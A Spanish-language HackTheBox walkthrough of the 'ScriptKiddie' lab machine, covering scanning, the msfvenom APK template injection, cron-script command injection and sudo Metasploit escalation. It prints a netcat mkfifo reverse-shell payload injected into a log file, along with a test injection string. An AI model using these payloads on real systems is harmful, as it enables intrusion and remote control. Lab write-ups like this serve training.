# Máquina "ScriptKiddie" de HackTheBox

## Características

- **Sistema Operativo:** Linux  
- **Dificultad:** Fácil 
- **Técnicas utilizadas:**
  - Msfvenom Exploitation [CVE-2020-7384] [RCE] 
  - Abusing Logs + Cron Job [Command Injection / User Pivoting] 
  - Abusing Sudoers Privilege [Msfconsole Privilege Escalation] 

## Útil para

- eJPT 
- OSCP (Escalada de privilegios)

**IP:** 10.10.10.226

## Reconocimiento

Comenzamos con un escaneo de puertos completo:

```bash
sudo nmap -sC -sV -p- 10.129.95.150 --min-rate 10000 
```

**Resultados del escaneo:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análisis del Servicio Web

El portal web está disponible en el puerto 5000: `http://10.10.10.226:5000`

Se trata de una página simple en formato de texto que proporciona algunas funciones básicas.

![Página web principal](/secciones/posts/imagenes/scriptkiddie/web2.webp)

### Enumeración de directorios

Utilizamos gobuster con la lista de palabras raft-small-words.txt de SecLists:

```bash
sudo gobuster dir -u http://10.129.95.150:5000/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster 
```

También intentamos buscar subcarpetas comunes ocultas con dirb:

```bash
dirb http://10.10.10.226:5000/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 13 22:54:50 2021
URL_BASE: http://10.10.10.226:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.226:5000/ ----
                                                                                                                                
-----------------
END_TIME: Sat Feb 13 23:03:50 2021
DOWNLOADED: 4612 - FOUND: 0
```

## Explotación de msfvenom

La segunda característica expuesta parece utilizar msfvenom del framework Metasploit. Aprovechamos la funcionalidad searchsploit de la aplicación para descubrir una vulnerabilidad en msfvenom.

Ciertas versiones de msfvenom son vulnerables a la inyección de comandos a través de la plantilla APK. Script Kiddie nos proporciona convenientemente una función de carga de plantillas.

![Selección de plantilla](/secciones/posts/imagenes/scriptkiddie/chose.png)

Utilizamos searchsploit con el argumento `-m` para copiar el exploit a nuestro directorio de trabajo actual. Posteriormente, editamos el exploit y cambiamos la payload a un comando cURL que descarga y ejecuta nuestro script de shell.

### Acceso inicial

Cargamos el archivo envenenado y ponemos netcat en escucha:

```bash
┌──(in7rud3r㉿Mykali)-[~]
└─$ nc -lvp 4444                                                                                           
listening on [any] 4444 ...
```

Una vez que obtenemos la conexión:

```bash
/home/kid/html
whoami
kid
```

¡La primera bandera es nuestra!

Transferimos netcat a la víctima y lo ejecutamos para mantener una shell más estable.

## Escalada de privilegios

### Enumeración del sistema

Durante la enumeración, encontramos información interesante sobre archivos SUID:

```
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms                                                                                          
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                    
-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                         
[...]
-rwsr-xr-x 1 root   root             31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
[...]
-rwsr-xr-x 1 root   root             84K May 28  2020 /usr/bin/chfn  --->  SuSE_9.3/10
[...]
-rwxr-sr-x 1 root   incron  103K Mar 22  2020 /usr/bin/incrontab
```

### Descubrimiento de otro usuario

Encontramos otro usuario en la carpeta de inicio, con una carpeta y un archivo que parece ser el script que ejecuta el escaneo nmap para el portal:

```bash
$ cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

### Explotación de Command Injection

El script crea un archivo en:

```
-rw-rw-r-- 1 kid pwn 0 Feb 14 11:06 /home/kid/logs/hackers
```

Aunque no podemos ejecutar el script directamente, parece ser vulnerable a inyección de comandos.

**Prueba del exploit:**

```bash
1 2 ;echo 'my test' >> finalfile.txt #
```

El resto de la cadena es el comando real que crea un archivo llamado "finalfile.txt". Este es un exploit de prueba que probamos en nuestra máquina para asegurarnos de que funciona.

**Payload final:**

```bash
$ echo "1 2 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.239 4445 >/tmp/f #" >> hackers
```

### Escalada final con sudo

En este punto ya hemos accedido al nuevo usuario. Ejecutamos `sudo -l` y descubrimos que podemos ejecutar el framework Metasploit como root.

Accedemos a msfconsole con privilegios de root y buscamos la flag final.

## Nota  

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes. Esto se debe a que en algunas de las máquinas que realicé, no tomé los apuntes necesarios o no capturé pantallas, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí.
 